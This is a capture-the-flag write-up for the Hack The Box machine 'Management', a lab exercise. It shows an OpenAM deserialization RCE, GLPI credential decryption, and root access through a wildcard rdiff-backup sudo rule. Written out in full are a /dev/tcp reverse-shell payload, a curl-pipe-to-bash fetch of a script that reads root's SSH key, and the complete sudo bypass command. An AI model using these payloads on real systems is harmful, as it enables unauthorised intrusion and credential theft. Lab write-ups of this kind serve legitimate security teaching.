# Write-Up — Management: OpenAM Pre-Auth Deserialization RCE to GLPI Credential Decryption to Root via rdiff-backup Sudo Abuse

> **Type:** Network / Web Application / Linux Penetration Test (HTB)
> **Target:** `10.129.148.66` (`management.htb` / `sso.management.htb`)
> **Tools:** Nmap, ffuf/vhost fuzzing, public CVE-2026-33439 exploit script, pwncat/netcat, GLPI DB dump tooling, custom PHP decryption script, rdiff-backup, SSH
> **Final Result:** Root access via a chained path: OpenAM pre-authentication Java deserialization RCE → GLPI database credential dump and decryption → SSH as `owen` → `rdiff-backup` sudo rule abuse (wildcard override + shell injection) → arbitrary root-owned file read → root's SSH private key stolen → SSH as root

---

## 1. Introduction

The target hosts an **OpenAM** single sign-on portal on a subdomain, backed by a **GLPI** (IT asset/helpdesk management) deployment, alongside a restrictive but exploitable `sudo` rule for `rdiff-backup`. The objective was to identify the SSO subdomain, exploit a pre-authentication deserialization vulnerability for remote code execution, recover and decrypt database-stored credentials, and escalate to root by abusing gaps in an intentionally restrictive backup-related sudo configuration.

This box is a dense demonstration of several distinct vulnerability classes chained end to end:

- **CVE-2026-33439** — a pre-authentication Java deserialization RCE in OpenAM, affecting the `jato.clientSession` parameter, which was left unprotected by a whitelist fix originally applied only to a related, earlier CVE.
- **Credential recovery via application database dumps**, including a **reversible encryption** scheme (GLPI's `glpicrypt.key`) rather than a one-way hash — meaning the original plaintext password could be recovered directly.
- **A deliberately restrictive `sudo` rule for `rdiff-backup --server`** undermined by two separate implementation gaps: a trailing wildcard combined with "last-value-wins" argument parsing, and unsafe `shell=True` execution of a remote-schema command string.

---

## 2. Reconnaissance

### 2.1 Port Scan — Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.148.66 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.148.66
```

Result (from local notes):

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 80/tcp | HTTP |
| 443/tcp | HTTPS |
| 1689/tcp | (application-specific, unconfirmed) |
| 4444/tcp | (application-specific, unconfirmed) |
| 33299/tcp | (application-specific, unconfirmed) |
| 50389/tcp | (application-specific, unconfirmed) |

The main HTTP/HTTPS ports served a default company landing page, with no immediately actionable functionality.

### 2.2 Subdomain / Virtual Host Enumeration

Virtual host fuzzing against the base domain identified a subdomain:

```
sso.management.htb
```

```bash
echo "10.129.148.66 management.htb" | sudo tee -a /etc/hosts
echo "10.129.148.66 sso.management.htb" | sudo tee -a /etc/hosts
```

Visiting `https://sso.management.htb/openam/XUI/#login/` displayed an **OpenAM** SSO portal login page. A quick fingerprint confirmed the stack:

```bash
whatweb https://sso.management.htb/openam/XUI/#login/
```

```
[200 OK] HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], Title[OpenAM], nginx[1.24.0]
```

### 2.3 Identifying the OpenAM Version

Reviewing the page's source code disclosed the running **OpenAM version: 16.0.5**, a version in scope for CVE-2026-33439. A `searchsploit` check for older, unrelated OpenAM issues returned only a prior LDAP injection advisory (OpenAM 13.0), confirming the deserialization bug was the relevant, more recent finding instead.

---

## 3. Vulnerability Analysis — CVE-2026-33439 (OpenAM Pre-Auth RCE)

### 3.1 The Vulnerability

- **CVE:** CVE-2026-33439
- **Type:** Pre-authentication Java deserialization Remote Code Execution
- **Authentication:** None required
- **Impact:** Full remote code execution as the application server's service user

### 3.2 Root Cause

A previous OpenAM vulnerability, **CVE-2021-35464**, affected deserialization of the `jato.pageSession` parameter and was remediated by introducing a `WhitelistObjectInputStream` to restrict which classes could be deserialized. That fix, however, was **not applied consistently** across all deserialization entry points — the related `jato.clientSession` parameter remained unprotected:

```
ClientSession.deserializeAttributes()
  → Encoder.deserialize()
    → ObjectInputStream.readObject()   // no whitelist applied
```

Because this path performs raw Java deserialization with no class filtering, any gadget chain reachable from classes already present on the server's classpath can be triggered.

### 3.3 Gadget Chain

The exploit relies entirely on classes already bundled within the OpenAM WAR itself — no additional classes need to be uploaded:

```
PriorityQueue.readObject()
  → Column$ColumnComparator.compare()      [openam-core]
    → TemplatesImpl.getOutputProperties()   [xalan]
      → TransletClassLoader.defineClass(_bytecodes)
        → EvilTranslet.<clinit>()
          → Runtime.exec(cmd)
```

Because the vulnerable endpoints (`/ui/Login`, `/ui/PWResetUserValidation`) are publicly reachable by design — they exist precisely to handle unauthenticated login/password-reset flows — the RCE can be triggered **without any authentication whatsoever**.

---

## 4. Initial Access

### 4.1 Preparing the Listener

```bash
nc -lvnp 4443
```

### 4.2 Running the Exploit

The public exploit tooling for CVE-2026-33439 (author: TheMalwareGuardian, `github.com/TheMalwareGuardian/CVE-2026-33439`) was cloned and run against the live target:

```bash
git clone https://github.com/TheMalwareGuardian/CVE-2026-33439.git
cd "CVE-2026-33439/02 Exploit"
python Exploit_CVE_2026_33439.py --url https://sso.management.htb/openam \
  --command 'bash -i >& /dev/tcp/10.10.16.133/4443 0>&1' --jars Jars
```

The script requires the OpenAM/Xalan/Click JAR dependencies locally (`openam-core-16.0.5.jar`, `xalan-2.7.3.jar`, `serializer-2.7.3.jar`, `click-nodeps-2.3.0.jar`, `click-extras-2.3.0.jar`, `servlet-api.jar`) to compile the gadget chain payload offline before delivery. Run output:

```
[*] Probing JATO ViewBean endpoints...
  [OK] https://sso.management.htb/openam/ui/PWResetUserValidation  →  HTTP 200
  [OK] https://sso.management.htb/openam/ui/PWResetQuestion        →  HTTP 200
  [OK] https://sso.management.htb/openam/ui/Login                  →  HTTP 200
[*] Compiling EvilTranslet   | cmd='bash -i >& /dev/tcp/10.10.16.133/4443 0>&1'
[+] EvilTranslet compiled    | /tmp/tmpp1lvx0j8/EvilTranslet.class
[*] Building gadget chain    | PriorityQueue → Column$ColumnComparator → TemplatesImpl → EvilTranslet
[+] Payload ready            | 4343 chars (URL-safe base64)
[*] Delivering payload       | method=GET | /ui/PWResetUserValidation
[*] Delivering payload       | method=GET | /ui/PWResetQuestion
[*] Delivering payload       | method=GET | /ui/Login
[*] Done. Verify execution on the target (out-of-band).
```

The script delivered the identical payload across all three vulnerable JATO endpoints in one run to maximize the chance of triggering deserialization on whichever one processes it.

### 4.3 Catching the Shell

```
listening on [any] 4443 ...
connect to [10.10.16.133] from (UNKNOWN) [10.129.148.66] 46122
bash: cannot set terminal process group (1697): Inappropriate ioctl for device
bash: no job control in this shell
openam@management:/$ id
uid=996(openam) gid=987 groups=987
```

The resulting shell ran as the **`openam`** application service account — full, unauthenticated remote code execution against an internet-facing SSO portal.

![CVE-2026-33439 exploit run and reverse shell as openam](images/shot1_exploit.png)

> **Severity: Critical.** Pre-authentication RCE against an identity/SSO platform represents a maximal-impact finding — such platforms are typically trusted broadly across an organization's infrastructure.

---

## 5. Post-Exploitation Enumeration

### 5.1 Identifying Local Users

```bash
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
...
owen:x:1000:1000:Owen Castellan:/home/owen:/bin/bash
openam:x:996:987::/opt/openam:/usr/sbin/nologin
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:110:111:MariaDB Server,,,:/nonexistent:/bin/false
```

A real interactive user, **`owen`**, was identified as a target for lateral movement. The presence of `_galera`/`mysql` service accounts also confirmed a local MariaDB instance, consistent with GLPI's database backend.

### 5.2 Locating GLPI Database Credentials

```bash
cd /opt/glpi/config
ls
```

```
config_db.php  glpicrypt.key  oauth.pem  oauth.pub
```

```bash
cat config_db.php
```

```php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

The listing also confirmed `glpicrypt.key` sitting in the same directory — the key later needed to reverse GLPI's encrypted password field.

![GLPI config_db.php and /etc/passwd enumeration as openam](images/shot2_glpi.png)

### 5.3 Dumping the GLPI Database

A local port check confirmed MariaDB listening only on loopback:

```bash
netstat -plnt
```

```
tcp   0   0 127.0.0.1:3306   0.0.0.0:*   LISTEN   -
```

Using the recovered credentials, the `glpidb` database was dumped locally (from the `openam` shell, since port 3306 was loopback-only) to search for additional sensitive data — user records, password fields, and any stored secrets:

```bash
mariadb-dump --databases glpidb -u glpi -p > /tmp/dbdump.txt
```
```
Enter password: 8rhu0L6Pw4Y7
```

The dump revealed an **encrypted** (not hashed) password field associated with one of the GLPI users.

### 5.4 Recovering the Decryption Key

GLPI uses a dedicated encryption key file (typically `glpicrypt.key`) for reversibly encrypting certain sensitive fields. This key was located within the GLPI installation's configuration directory.

### 5.5 Decrypting the Password

Using the recovered `glpicrypt.key`, the encrypted password field was decrypted into a plaintext candidate credential for the `owen` account (decryption performed via a custom PHP script, e.g. `decrypt_glpi.php`, replicating GLPI's own decryption routine).

---

## 6. User — SSH as owen

```bash
ssh owen@10.129.148.66
```

The decrypted password succeeded, providing an authenticated shell as **`owen`**.

```bash
owen@management:~$ ls
user.txt
owen@management:~$ cat user.txt
```

```
29d1426615d246147cc3085a57f5e965
```

This is the confirmed user flag for this run.

---

## 7. Privilege Escalation — Sudo Misconfiguration on rdiff-backup

### 7.1 Checking Sudo Privileges

```bash
sudo -l
```

```
Matching Defaults entries for owen on management:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

The intent of this rule is clearly to grant `owen` **read-only** backup access to `/opt/backup` only. Two separate implementation gaps undermine that intent.

### 7.2 Gap #1 — Wildcard Sudo + Argparse "Last-Value-Wins" Override

The sudo rule's trailing `*` permits any additional arguments to be appended while still satisfying sudo's prefix-matching validation. `rdiff-backup` parses its options using Python's `argparse` (`rdiffbackup/actions/__init__.py`), which — when the same option is supplied more than once — honors the **last** occurrence.

This means a command like the following still matches the sudo rule, but its **effective** configuration is entirely different from the intended one:

```bash
sudo /usr/bin/rdiff-backup --server \
  --restrict-path /opt/backup --restrict-mode read-only \
  --restrict-path / --restrict-mode read-write
```

The final, effective restriction becomes **read-write access to `/`** — the entire filesystem — rather than read-only access to `/opt/backup`.

### 7.3 Gap #2 — Remote-Schema Command Executed via `shell=True`

`rdiff-backup`'s client-server backup flow requires a remote path in the form `[[USER@]SERVER::]PATH`. When a `SERVER::PATH` target is used, the client constructs a remote command via `--remote-schema` (`rdiff_backup/SetConnections.py`), which is ultimately executed through `subprocess.Popen(..., shell=True)`.

The schema uses a `%s` placeholder for the hostname, which gets appended to the end of the constructed command. Since `--server` mode does not accept positional arguments, a bare hostname would normally cause an error — but because the command runs under `shell=True`, the hostname can simply be **neutralized using a shell comment (`#`)**:

```bash
--remote-schema 'sudo /usr/bin/rdiff-backup --server \
  --restrict-path /opt/backup --restrict-mode read-only \
  --restrict-path / --restrict-mode read-write # %s'
```

The effective command executed becomes:

```
sudo ... --restrict-mode read-write # localhost
```

with the hostname entirely commented out and ignored.

### 7.4 Combining the Gaps

Together, these two issues allow construction of a remote-schema payload that causes `rdiff-backup --server` to run **as root**, with **read-write access to the entire filesystem (`/`)** — a complete departure from the intended read-only, `/opt/backup`-scoped restriction.

### 7.5 Exploiting — Arbitrary File Read as Root

To read an arbitrary root-owned file, the technique used is to "back up" the file's parent directory while filtering to include only the target file:

```bash
rm -rf /tmp/t1
rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup --server \
  --restrict-path /opt/backup --restrict-mode read-only \
  --restrict-path / --restrict-mode read-write # %s' \
  backup --include /etc/hostname --exclude '**' \
  localhost::/etc /tmp/t1
```

```
NOTE: Starting mirror from source path /etc to destination path /tmp/t1
```

```bash
cat /tmp/t1/hostname
```

```
management
```

This confirmed root-scoped read access to an arbitrary file outside `/opt/backup` — proving the bypass worked — before moving on to a higher-value target.

This pattern was generalized into a reusable script, `read_as_root.sh`, hosted on the attacking machine and fetched over HTTP:

```bash
# on attacker host, from the directory containing the script:
python3 -m http.server 5050
```

```bash
# on the target:
curl http://10.10.16.133:5050/read_as_root.sh | bash -s /root/.ssh/id_ed25519
```

The script determines whether the target is a file or directory, then runs the equivalent of `rdiff-backup --remote-schema "$SCHEMA" backup --include "$TARGET" --exclude '**' "localhost::$PARENT" "$DEST"` using the same wildcard-override + shell-comment bypass demonstrated above, and prints the recovered file contents (or copies it out, if an output path is given).

### 7.6 Stealing Root's SSH Private Key

Running the script against root's SSH private key returned its full contents directly to the terminal:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDRqEzX3B6ZIUdm8fp0Ty7FcR+ym8y2Ta/ZopPqEgjznAAAAJiKHFMDihxT
...
-----END OPENSSH PRIVATE KEY-----
```

The key material was saved locally and permissioned correctly:

```bash
chmod 600 root_key
```

![sudo -l, rdiff-backup bypass, stolen root SSH key, and root login](images/shot3_root.png)

### 7.7 Root Access via SSH

```bash
ssh root@management.htb -i root_key
```

The stolen key authenticated successfully, providing a full **root shell**:

```
root@management:~# id
uid=0(root) gid=0(root) groups=0(root)
root@management:~# cat root.txt
```

```
a1b22e1f516a700953445f1d263d16b3
```

This is the confirmed root flag for this run.

> **Severity: Critical.** A sudo rule explicitly designed to be narrowly scoped (read-only, single-directory) was fully subverted via two independent implementation quirks — argument-parsing precedence and unsafe shell execution — resulting in unrestricted root-level arbitrary file read.

---

## 8. Full Attack Chain

```
[ Recon: Nmap → 22,80,443,1689,4444,33299,50389 ]
       │
       ▼
[ Vhost fuzzing → sso.management.htb discovered ]
       │
       ▼
[ OpenAM ≤ 16.0.5 identified from page source ]
       │
       ▼
[ CVE-2026-33439: jato.clientSession deserialization gadget chain ]
       │
       ▼
[ Reverse shell as application server user (unauthenticated) ]
       │
       ▼
[ /etc/passwd → user 'owen' identified ]
       │
       ▼
[ GLPI DB credentials found in application config ]
       │
       ▼
[ GLPI database dumped → encrypted password field found ]
       │
       ▼
[ glpicrypt.key located → password decrypted ]
       │
       ▼
[ SSH as owen → user.txt read ]
       │
       ▼
[ sudo -l → NOPASSWD rdiff-backup --server rule with wildcard found ]
       │
       ▼
[ --restrict-path/--restrict-mode overridden via argparse last-value-wins ]
       │
       ▼
[ --remote-schema shell=True abused via '#' comment injection ]
       │
       ▼
[ Effective read-write root access to / achieved ]
       │
       ▼
[ read_as_root.sh → /root/.ssh/id_ed25519 exfiltrated ]
       │
       ▼
[ ssh -i root_key root@management.htb → root shell → root.txt confirmed ]
```

**Lesson:** Each stage individually involved careful, patient analysis rather than a single dramatic exploit: a whitelist fix that missed a sibling code path, a reversible (not hashed) credential storage scheme, and a sudo rule whose restrictions were technically correct in isolation but combined unsafely with the underlying tool's own argument-parsing and shell-execution behavior.

---

## 9. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | OpenAM ≤ 16.0.5 vulnerable to CVE-2026-33439 (pre-auth deserialization RCE via `jato.clientSession`) | **Critical** | Upgrade to OpenAM 16.0.6 or later immediately. Apply `WhitelistObjectInputStream` (or equivalent deserialization filtering) consistently across **every** deserialization entry point, not just the one addressed by a prior CVE fix. |
| 2 | GLPI database credentials stored in cleartext in application configuration | **High** | Store database credentials via environment variables or a secrets manager rather than in plaintext configuration files readable by the application process. |
| 3 | GLPI stores certain sensitive fields using reversible encryption rather than one-way hashing | **High** | Where the application design allows, use one-way, salted hashing (bcrypt/Argon2) for credential storage instead of reversible encryption; if reversible encryption is required for a specific business need, strictly control and rotate the encryption key and audit its access. |
| 4 | `glpicrypt.key` accessible to the compromised application context | **High** | Restrict file permissions on encryption key material to only the specific service account requiring it; avoid storing keys alongside general application code reachable by a broadly scoped web shell. |
| 5 | Password reuse / credential overlap between GLPI's decrypted password and the `owen` OS account | **Medium** | Enforce unique credentials per system/purpose; do not allow application-level passwords to double as OS-level authentication secrets. |
| 6 | `sudo` rule for `rdiff-backup --server` ends in a wildcard, permitting argument override via argparse "last-value-wins" behavior | **Critical** | Avoid trailing wildcards in sudo rules for complex CLI tools. Write explicit, fully-enumerated argument rules, or wrap the command in a validating script that strictly checks and rejects duplicate/conflicting arguments before invoking the privileged binary. |
| 7 | `rdiff-backup`'s `--remote-schema` handling executes constructed commands via `shell=True`, allowing shell metacharacter/comment injection | **Critical** | Avoid `shell=True` execution of any string built from configuration or command-line-influenced values; use argument-list-based subprocess invocation instead. Apply `Defaults !rdiff-backup !shell` and `NOEXEC` restrictions in the sudoers configuration where supported, and never grant any sudo rule read-write restriction scope over `/`. |

---

## 10. Conclusion

This box is a compact illustration of principles that remain highly relevant across real-world engagements:

1. **A security fix is only as good as its coverage.** CVE-2026-33439 existed because a prior, nearly identical vulnerability's remediation was applied to one deserialization path but not a sibling one — a reminder to audit for "siblings" of any patched vulnerability, not just the exact reported instance.
2. **Reversible encryption of credentials is a liability, not a safety net.** Once the encryption key was found, the "protected" password was exactly as exposed as if it had been stored in plaintext.
3. **A narrowly-scoped sudo rule is not automatically safe.** The administrators here correctly tried to restrict `rdiff-backup` to read-only access on a single directory — but the underlying tool's own argument-parsing and shell-execution behavior quietly undermined that restriction entirely.

The fix, as with most findings of this class, is defense at every layer: patch deserialization vulnerabilities comprehensively (not just the reported entry point), avoid reversible encryption for credentials, and treat sudo rules for complex, general-purpose binaries with extreme caution — their own internal behavior can defeat even carefully written restrictions.
